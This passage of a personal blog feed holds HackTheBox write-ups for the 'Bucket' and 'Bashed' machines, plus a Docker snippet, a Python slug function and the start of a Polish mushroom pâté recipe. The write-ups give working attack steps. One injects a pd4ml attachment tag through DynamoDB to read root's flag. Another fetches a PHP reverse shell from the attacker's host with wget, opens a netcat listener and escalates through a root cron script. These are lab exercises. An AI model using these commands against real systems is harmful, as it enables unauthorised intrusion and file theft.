                        &lt;span class="s1"&gt;&amp;#39;FilterExpression&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; &lt;span class="s2"&gt;&amp;quot;title = :title&amp;quot;&lt;/span&gt;,
                        &lt;span class="s1"&gt;&amp;#39;ExpressionAttributeValues&amp;#39;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;&amp;gt; array&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;:title&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&amp;gt;array&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;S&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&amp;gt;&lt;span class="s2"&gt;&amp;quot;Ransomware&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;,
                &lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

                foreach &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;$iterator&lt;/span&gt; as &lt;span class="nv"&gt;$item&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
                        &lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;rand&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;,10000&lt;span class="o"&gt;)&lt;/span&gt;.&lt;span class="s1"&gt;&amp;#39;.html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                        file_put_contents&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;files/&amp;#39;&lt;/span&gt;.&lt;span class="nv"&gt;$name&lt;/span&gt;,&lt;span class="nv"&gt;$item&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;data&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;])&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
                &lt;span class="o"&gt;}&lt;/span&gt;
                passthru&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/&lt;/span&gt;&lt;span class="nv"&gt;$name&lt;/span&gt;&lt;span class="s2"&gt; 800 A4 -out files/result.pdf&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="k"&gt;else&lt;/span&gt;
&lt;span class="o"&gt;{&lt;/span&gt;
?&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Looks promissing, but will it be enough? To escalate to root we need to take controll over a process running with root privileges. We will take a look at the apache config:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;roy@bucket:/var/www/bucket-app$ head /etc/apache2/sites-available/000-default.conf 
&amp;lt;VirtualHost &lt;span class="m"&gt;127&lt;/span&gt;.0.0.1:8000&amp;gt;
        &amp;lt;IfModule mpm_itk_module&amp;gt;
                AssignUserId root root
        &amp;lt;/IfModule&amp;gt;
        DocumentRoot /var/www/bucket-app
&amp;lt;/VirtualHost&amp;gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;God bless the man who did it. And forbid him.&lt;/p&gt;
&lt;p&gt;Now we need to read carefully what we have above in the &lt;strong&gt;index.php&lt;/strong&gt; file.&lt;/p&gt;
&lt;p&gt;There is a script, that is executed by a certain request from the vulnerable machine:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -X POST -F &lt;span class="s1"&gt;&amp;#39;action=get_alerts&amp;#39;&lt;/span&gt; http://127.0.0.1:8000 &lt;span class="p"&gt;;&lt;/span&gt; rm /tmp/hack/* &lt;span class="p"&gt;;&lt;/span&gt; cp * /tmp/unc
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But to do anything we have to insert something to &lt;em&gt;alerts&lt;/em&gt; table in dynamodb with the title of &lt;em&gt;Ransomware&lt;/em&gt;. We have seen before, that there is no such table as &lt;em&gt;alerts&lt;/em&gt;, so we have first to create it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;title,AttributeType&lt;span class="o"&gt;=&lt;/span&gt;S &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;data,AttributeType&lt;span class="o"&gt;=&lt;/span&gt;S --key-schema &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;title,KeyType&lt;span class="o"&gt;=&lt;/span&gt;HASH &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;data,KeyType&lt;span class="o"&gt;=&lt;/span&gt;RANGE --provisioned-throughput &lt;span class="nv"&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;,WriteCapacityUnits&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;then we will be able to inject out exploit:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb put-item --table-name alerts --item &lt;span class="s1"&gt;&amp;#39; { &amp;quot;title&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;Ransomware&amp;quot;}, &amp;quot;data&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;EXPLOIT PLACEHOLDER&amp;quot;} } &amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But wait, do we have one? Sure, take a look at the line: &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="x"&gt;passthru(&amp;quot;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;it is our key to the kingdom. Google &lt;em&gt;pd4ml vulnerabilities&lt;/em&gt; to find this awesome article: https://infosecwriteups.com/how-i-hacked-redbus-an-online-bus-ticketing-application-24ef5bb083cd about &lt;em&gt;pd4ml:attachment&lt;/em&gt; tag, that we can use here. &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb put-item --table-name alerts --item &lt;span class="s1"&gt;&amp;#39; { &amp;quot;title&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;Ransomware&amp;quot;}, &amp;quot;data&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;&amp;lt;html&amp;gt; &amp;lt;pd4ml:attachment src=file:///root/root.txt description=test&amp;gt;&amp;lt;/pd4ml:attachment&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;} } &amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finding a perfect syntax to send to the db is a bit of a pain. The &lt;em&gt;description&lt;/em&gt; attribute seems to be mandatory, but -- thanks God -- brackets around the arguments values aren't, which makes it a bit easier to read, cause we don't need to escape it.&lt;/p&gt;
&lt;p&gt;There is one more problem. There is a cront task, that is clearing the database and the &lt;em&gt;/var/www/bucket-app/files&lt;/em&gt; directory every few minutes. So we have to be fast. Or smart. Fast and smart.&lt;/p&gt;
&lt;p&gt;We have to execute this oneliner on our machine:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;title,AttributeType&lt;span class="o"&gt;=&lt;/span&gt;S &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;data,AttributeType&lt;span class="o"&gt;=&lt;/span&gt;S --key-schema &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;title,KeyType&lt;span class="o"&gt;=&lt;/span&gt;HASH &lt;span class="nv"&gt;AttributeName&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;data,KeyType&lt;span class="o"&gt;=&lt;/span&gt;RANGE --provisioned-throughput &lt;span class="nv"&gt;ReadCapacityUnits&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;,WriteCapacityUnits&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;5&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;aws --endpoint-url&lt;span class="o"&gt;=&lt;/span&gt;http://s3.bucket.htb dynamodb put-item --table-name alerts --item &lt;span class="s1"&gt;&amp;#39; { &amp;quot;title&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;Ransomware&amp;quot;}, &amp;quot;data&amp;quot;: {&amp;quot;S&amp;quot;: &amp;quot;&amp;lt;html&amp;gt; &amp;lt;pd4ml:attachment src=file:///root/root.txt description=test&amp;gt;&amp;lt;/pd4ml:attachment&amp;gt;&amp;lt;/html&amp;gt;&amp;quot;} } &amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;and after that this one on the vulnerable one:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;curl -X POST -F &lt;span class="s1"&gt;&amp;#39;action=get_alerts&amp;#39;&lt;/span&gt; http://127.0.0.1:8000 &lt;span class="p"&gt;;&lt;/span&gt; rm -r /tmp/hack &lt;span class="p"&gt;;&lt;/span&gt; mkdir -p /tmp/hack &lt;span class="p"&gt;;&lt;/span&gt; cp /var/www/bucket-app/files/* /tmp/hack &lt;span class="p"&gt;;&lt;/span&gt; cat /tmp/hack/result.pdf
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Thats the speed of light, babe! Inside the pdf content we can see this part:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/Type /EmbeddedFile
/Length 33
/Params 5 0 R
&amp;gt;&amp;gt;
stream
3ba97200d588ae0d517c117a03396f10
endstream
endobj
7 0 obj
&amp;lt;&amp;lt;
/Type /Filespec
/F (root.txt)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yay! See the root flag in the middle?&lt;/p&gt;</content><category term="HackTheBox"></category><category term="hackthebox"></category><category term="htb"></category><category term="solution"></category><category term="hacking"></category></entry><entry><title>Fastest way to run PHP site on Docker</title><link href="/php-in-docker-snippet.html" rel="alternate"></link><published>2020-08-26T15:30:00+02:00</published><updated>2020-08-26T15:30:00+02:00</updated><author><name>Paweł Mateja</name></author><id>tag:None,2020-08-26:/php-in-docker-snippet.html</id><summary type="html">&lt;p&gt;Just a tiny snippet for future use&lt;/p&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;docker run -p &lt;span class="m"&gt;80&lt;/span&gt;:80  -v &lt;span class="sb"&gt;`&lt;/span&gt;&lt;span class="nb"&gt;pwd&lt;/span&gt;&lt;span class="sb"&gt;`&lt;/span&gt;:/var/www/html php:7.2-apache
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yup, thats all. I just wanted to have this for fast future use&lt;/p&gt;</content><category term="Snippets"></category><category term="docker"></category><category term="bash"></category></entry><entry><title>Python snippet for making slugs</title><link href="/slug.html" rel="alternate"></link><published>2020-07-09T23:00:00+02:00</published><updated>2020-07-09T23:00:00+02:00</updated><author><name>Paweł Mateja</name></author><id>tag:None,2020-07-09:/slug.html</id><summary type="html">&lt;p&gt;Just a tiny snippet for future use&lt;/p&gt;</summary><content type="html">&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;unicodedata&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;string&lt;/span&gt;


&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;slug&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;separator&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;-&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;text&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;separator&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;ł&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;l&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;nfkd_form&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;unicodedata&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;normalize&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;NFKD&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;([&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;nfkd_form&lt;/span&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;unicodedata&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;combining&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
                    &lt;span class="ow"&gt;and&lt;/span&gt; &lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;string&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ascii_lowercase&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;separator&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</content><category term="Python"></category><category term="python"></category></entry><entry><title>Bashed</title><link href="/bashed.html" rel="alternate"></link><published>2020-01-13T20:00:00+01:00</published><updated>2020-01-13T20:00:00+01:00</updated><author><name>Paweł Mateja</name></author><id>tag:None,2020-01-13:/bashed.html</id><summary type="html">&lt;p&gt;Solution to the &lt;em&gt;Bashed&lt;/em&gt; VM&lt;/p&gt;</summary><content type="html">&lt;h1&gt;User flag&lt;/h1&gt;
&lt;p&gt;It is not really necessary to start this one with &lt;strong&gt;nmap&lt;/strong&gt;, but it's never a bad first step&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kali:~# nmap -sS -Pn -sV &lt;span class="m"&gt;10&lt;/span&gt;.10.10.68
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Starting Nmap 7.70 ( https://nmap.org ) at 2020-01-13 13:20 CET
Nmap scan report for 10.10.10.68
Host is up (0.11s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.24 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As we can see, only port 80 is opened. After opening it in web browser, there is a unfinished, but already launched website. We can dig a bit through it, just to learn that it is connected to a &lt;strong&gt;phpbash&lt;/strong&gt; project. That's nice, but we want to speed things up.&lt;/p&gt;
&lt;p&gt;We can run several tools to look for cool and useful, but hidden urls. My first choice here is DirBuster.
It takes him a few minutes to find the thing we need:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://10.10.10.68/dev/phpbash.php
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;After opening that link we know that we are in the right place. It's an online bash terminal. So wy not to try to look for the first flag?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ls /user
$ cat /home/arrexel/user.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Yup, we got it!&lt;/p&gt;
&lt;h1&gt;Root flag&lt;/h1&gt;
&lt;p&gt;&lt;em&gt;phpbash&lt;/em&gt; is nice, but doesn't provide a full terminal experience. A reverse shell is wat we need.&lt;/p&gt;
&lt;p&gt;Firstly we need a place in the /var/www/html path to store it. Only the &lt;strong&gt;upload&lt;/strong&gt; dir will do, but we need nothing more. Except of course of a php reverse shell with out IP in it's config. I've already got it on my Kali VM, served by an apache instance, so it's easy:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;www-data:/var/www/html/uploads# wget &lt;span class="m"&gt;10&lt;/span&gt;.10.14.16/shell.php
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now I can open netcat on my Kali, and load 10.10.10.68/upload/shell.php in my web browser.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kali:/var/www/html# nc -v -n -l -p &lt;span class="m"&gt;1234&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It works, so now the same thing in &lt;em&gt;/tmp&lt;/em&gt; dir &lt;em&gt;LinEnum&lt;/em&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;cd&lt;/span&gt; /tmp
wget &lt;span class="m"&gt;10&lt;/span&gt;.10.14.16/LinEnum.sh
bash ./LinEnum.sh
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can see good stuff in it's output!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We knew about this user already from listing the home directory. Now we can sudo it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ sudo -u scriptmanager bash
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Works. What next? We need something to find a point for privilege escalation. &lt;strong&gt;pspy&lt;/strong&gt; will help us with it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;./pspy64
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;2020&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;01&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;13&lt;/span&gt; &lt;span class="nt"&gt;05&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;46&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;01&lt;/span&gt; &lt;span class="nt"&gt;CMD&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;UID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;0&lt;/span&gt;    &lt;span class="nt"&gt;PID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;2297&lt;/span&gt;   &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nt"&gt;python&lt;/span&gt; &lt;span class="nt"&gt;test&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;py&lt;/span&gt;
&lt;span class="nt"&gt;2020&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;01&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;13&lt;/span&gt; &lt;span class="nt"&gt;05&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;46&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;01&lt;/span&gt; &lt;span class="nt"&gt;CMD&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;UID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;0&lt;/span&gt;    &lt;span class="nt"&gt;PID&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;2296&lt;/span&gt;   &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;bin&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;sh&lt;/span&gt; &lt;span class="nt"&gt;-c&lt;/span&gt; &lt;span class="nt"&gt;cd&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;scripts&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;for&lt;/span&gt; &lt;span class="nt"&gt;f&lt;/span&gt; &lt;span class="nt"&gt;in&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;py&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;do&lt;/span&gt; &lt;span class="nt"&gt;python&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;$f&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;done&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Nice, we can see, that &lt;strong&gt;/scrips&lt;/strong&gt; dir is owned by &lt;strong&gt;scriptmanager&lt;/strong&gt;!&lt;/p&gt;
&lt;p&gt;Now we need a tiny root.txt stealing python script. It doesn't need to be fancy.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;shutil&lt;/span&gt;
&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;os&lt;/span&gt;
&lt;span class="n"&gt;shutil&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;copy&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/root/root.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;/tmp/root.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;chmod 777 /tmp/root.txt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As in every step, I've served it on my Kali apache, so:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ wget &lt;span class="m"&gt;10&lt;/span&gt;.10.14.16/bashed/run.py

sudo -u scriptmanager cp run.py /scripts
$ cat /tmp/root.txt
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;IT'S ROOTED. It was not difficult but fun!&lt;/p&gt;</content><category term="HackTheBox"></category><category term="hackthebox"></category><category term="htb"></category><category term="solution"></category><category term="hacking"></category></entry><entry><title>Ultimate pasztet grzybowy ze słonecznika</title><link href="/ultimate-pasztet-grzybowy-ze-slonecznika.html" rel="alternate"></link><published>2018-10-07T00:00:00+02:00</published><updated>2018-10-07T00:00:00+02:00</updated><author><name>Pawel Mateja</name></author><id>tag:None,2018-10-07:/ultimate-pasztet-grzybowy-ze-slonecznika.html</id><summary type="html">&lt;p&gt;Chciałem zacząć ten wpis od akapitu o karmieniu pasztetem papieża, ale za kilka dni święta, więc sobie daruję, bo szkoda pominąć istotniejszy, choć mniej śmieszny kontekst. Rzecz jest prosta: grzybowy pasztet ze słonecznika to jest ultimate paszetet, taki który możecie wrzucić do święconego koszyczka na wielkanoc i który będzie wchodził …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Chciałem zacząć ten wpis od akapitu o karmieniu pasztetem papieża, ale za kilka dni święta, więc sobie daruję, bo szkoda pominąć istotniejszy, choć mniej śmieszny kontekst. Rzecz jest prosta: grzybowy pasztet ze słonecznika to jest ultimate paszetet, taki który możecie wrzucić do święconego koszyczka na wielkanoc i który będzie wchodził w Boże narodzenie jak złoto. Niekoniecznie w czasie wieczerzy, bo to smarowidło do chleba, ale jako zerowanie kubków smakowych po słodkim albo na śniadanie to po prostu bajka. W następnych dwóch akapitach będę obrażał pasztet z mięsa, przy okazji tłumacząc dlaczego mój jest lepszy. Możecie wykorzystać te argumenty w dyskusji przy wigilijnym stole. &lt;/p&gt;
&lt;p&gt;Mamy tu do czynienia z ideałem. Nie z jakimś pasztetem ze świni ujebanej gównem, tylko eleganckim wyrobem z dojrzewających w polskim słońcu nasion słonecznika, symbolu szczęścia i miłości, z aromatycznej cebuli, symbolu kuchni nie tylko polskej, ale też francuskiej oraz z najszlachetniejszych grzybów ze śląskich lasów: borowików albo podgrzybków, które śmiało można nazwać jedną z największych tajemnic kuchni europejskiej, skarbu dziczy o rozlicznych wartościach odżyczych, których bogactwa do tej pory nie pojęto w całości. Powtarzam, żeby było to jasne, w tym papieskim pasztecie żaden ze składników nie ma odbytu ani szczeciny, nie ma tu -- przepraszam za dosadność -- smaku chlewa i gówna.&lt;/p&gt;
&lt;p&gt;Co więcej, poza brakiem wspomaniego aromatu świni albo kury, który -- umówmy się -- nie jest wartością dodaną, nie brak mu niczego. Jest tłusty, ma białeczko, umami, wędzony aromat i odpowiednią smarowność. Po przejściu na wegetarianizm początkowo bardzo mi właśnie pasztetu, zwłaszcza że wszelkie pasty ze strączków, nawet te najsmaczniejsze, dawały rezultat znacząco inny od tego, który mogłem kupić w mięsnym za 20zł/kg. Dopiero ten przepis sprawił, że z pełną pogardą mogę patrzeć na mieloną świnię. Słowo daję, możecie podsunąć kanapkę z nim nie tylko głowie Kościoła, gdyby akurat was odwiedziła, ale też znajomym przy wódeczce, pewnie nawet nie zauważą różnicy, tylko powiedzą, że dobre i że chcą jeszcze. Tak będzie, nie zmyślam.&lt;/p&gt;
&lt;h2&gt;Przepis&lt;/h2&gt;
&lt;h3&gt;Składniki&lt;/h3&gt;
&lt;ul&gt;
